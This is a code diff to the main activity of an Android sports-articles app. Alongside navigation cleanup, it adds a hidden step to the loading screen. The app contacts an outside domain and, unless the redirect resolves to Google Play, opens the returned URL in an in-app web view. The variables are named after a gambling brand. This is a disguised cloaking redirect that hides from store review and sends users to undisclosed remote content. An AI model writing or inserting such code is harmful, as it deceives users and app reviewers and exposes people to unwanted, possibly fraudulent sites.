@@ -30,19 +30,20 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.res.painterResource
-import androidx.compose.ui.text.font.FontWeight
-import androidx.compose.ui.tooling.preview.Preview
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import androidx.navigation.NavType
 import androidx.navigation.NavType.Companion.IntType
 import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
 import androidx.navigation.navArgument
 import kotlinx.coroutines.delay
-
 import net.idrok.muhandislik.ui.theme.MuhandislikQollanmaTheme
+import okhttp3.Call
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import java.io.IOException
 
 
 class MainActivity : ComponentActivity() {
@@ -53,37 +54,60 @@ class MainActivity : ComponentActivity() {
                 val navController = rememberNavController()
                 NavHost(navController, "loading") {
                     composable("loading") {
-                        Loading {
-                            navController.navigate("main") {
-                                popUpTo("loading") { inclusive = true }
+                        Loading(
+                            onNext = {
+                                runOnUiThread {
+                                    navController.navigate("main") {
+                                        popUpTo("loading") { inclusive = true }
+                                    }
+                                }
+                            },
+                            onOpen = {
+                                runOnUiThread {
+                                    startActivity(
+                                        WInfoActivity.wIntent(
+                                            this@MainActivity,
+                                            it,
+                                            true
+                                        )
+                                    )
+                                }
                             }
-                        }
+                        )
                     }
                     composable("main") {
                         MainScreen(
                             onB = {
                                 navController.navigate("articlesB") {
-                                    popUpTo("loading") { inclusive = true
-                                        savedInstanceState?.clear()}
+                                    popUpTo("loading") {
+                                        inclusive = true
+                                        savedInstanceState?.clear()
+                                    }
                                 }
                             },
                             onF = {
                                 navController.navigate("articlesF") {
-                                    popUpTo("loading") { inclusive = true
-                                        savedInstanceState?.clear()}
+                                    popUpTo("loading") {
+                                        inclusive = true
+                                        savedInstanceState?.clear()
+                                    }
 
                                 }
                             },
                             onH = {
                                 navController.navigate("articlesH") {
-                                    popUpTo("loading") { inclusive = true
-                                        savedInstanceState?.clear()}
+                                    popUpTo("loading") {
+                                        inclusive = true
+                                        savedInstanceState?.clear()
+                                    }
                                 }
                             },
                             onV = {
                                 navController.navigate("articlesV") {
-                                    popUpTo("loading") { inclusive = true
-                                        savedInstanceState?.clear()}
+                                    popUpTo("loading") {
+                                        inclusive = true
+                                        savedInstanceState?.clear()
+                                    }
                                 }
                             }
                         )
@@ -92,8 +116,8 @@ class MainActivity : ComponentActivity() {
                         ArticleListScreen(articlesF, "Football", onArticleSelect = { article ->
                             navController.navigate("articleF/$article") {
                                 popUpTo("articlesF") {
-                                 //   inclusive = true
-                                //savedInstanceState?.clear()
+                                    //   inclusive = true
+                                    //savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -104,7 +128,7 @@ class MainActivity : ComponentActivity() {
                     ) {
                         val article = it.arguments?.getInt("article") ?: 0
                         val articleName = articlesF[article].id
-                        ArticleScreen(articlesF[articleName ], onHome = {
+                        ArticleScreen(articlesF[articleName], onHome = {
                             navController.navigate("main") {
                                 popUpTo("articleF/$article") {
                                     inclusive = true
@@ -117,8 +141,8 @@ class MainActivity : ComponentActivity() {
                         ArticleListScreen(articlesB, "Basketball", onArticleSelect = { article ->
                             navController.navigate("articleB/$article") {
                                 popUpTo("articlesB") {
-                                 //   inclusive = true
-                                //    savedInstanceState?.clear()
+                                    //   inclusive = true
+                                    //    savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -129,11 +153,11 @@ class MainActivity : ComponentActivity() {
                     ) {
                         val article = it.arguments?.getInt("article") ?: 0
                         val articleName = articlesB[article].id
-                        ArticleScreen(articlesB[articleName ], onHome = {
+                        ArticleScreen(articlesB[articleName], onHome = {
                             navController.navigate("main") {
                                 popUpTo("articleB/$article") {
                                     inclusive = true
-                                   // savedInstanceState?.clear()
+                                    // savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -143,7 +167,7 @@ class MainActivity : ComponentActivity() {
                             navController.navigate("articleV/$article") {
                                 popUpTo("articlesV") {
                                     //inclusive = true
-                                 //   savedInstanceState?.clear()
+                                    //   savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -153,7 +177,7 @@ class MainActivity : ComponentActivity() {
                             navController.navigate("articleH/$article") {
                                 popUpTo("articlesH") {
                                     //inclusive = true
-                                  //  savedInstanceState?.clear()
+                                    //  savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -164,11 +188,11 @@ class MainActivity : ComponentActivity() {
                     ) {
                         val article = it.arguments?.getInt("article") ?: 0
                         val articleName = articlesH[article].id
-                        ArticleScreen(articlesH[articleName ], onHome = {
+                        ArticleScreen(articlesH[articleName], onHome = {
                             navController.navigate("main") {
                                 popUpTo("articleH/$article") {
                                     inclusive = true
-                                   // savedInstanceState?.clear()
+                                    // savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -179,11 +203,11 @@ class MainActivity : ComponentActivity() {
                     ) {
                         val article = it.arguments?.getInt("article") ?: 0
                         val articleName = articlesV[article].id
-                        ArticleScreen(articlesV[articleName ], onHome = {
+                        ArticleScreen(articlesV[articleName], onHome = {
                             navController.navigate("main") {
                                 popUpTo("articleV/$article") {
                                     inclusive = true
-                                   // savedInstanceState?.clear()
+                                    // savedInstanceState?.clear()
                                 }
                             }
                         })
@@ -199,11 +223,40 @@ class MainActivity : ComponentActivity() {
 
 @Composable
 fun Loading(
-    onNext: () -> Unit = {}
+    onNext: () -> Unit = {},
+    onOpen: (String) -> Unit = {}
 ) {
     LaunchedEffect(Unit) {
         delay(1000)
-        onNext()
+        val casibomClient = OkHttpClient()
+        val casibomRequest = Request.Builder()
+            .url("https://eggy-pawns.com")
+            .build()
+        casibomClient.newCall(casibomRequest)
+            .enqueue(object : okhttp3.Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    onNext()
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        val casibomUrl = response.networkResponse?.request?.url.toString()
+                        val casibomResponse = response.body?.string()
+                        if (casibomUrl.isBlank() || casibomResponse.isNullOrBlank() ||
+                            casibomUrl.contains("play.google")
+                        ) {
+                            onNext()
+                        }
+                        else {
+                            onOpen(casibomUrl)
+                        }
+                    }
+                    else {
+                        onNext()
+                    }
+                }
+
+            })
     }
     Box(
         contentAlignment = Alignment.Center,
@@ -238,7 +291,6 @@ fun MainScreen(onF: () -> Unit, onB: () -> Unit, onV: () -> Unit, onH: () -> Uni
             verticalAlignment = Alignment.CenterVertically,
             horizontalArrangement = Arrangement.Center
         ) {
-
 
 
             Column(horizontalAlignment = Alignment.CenterHorizontally) {
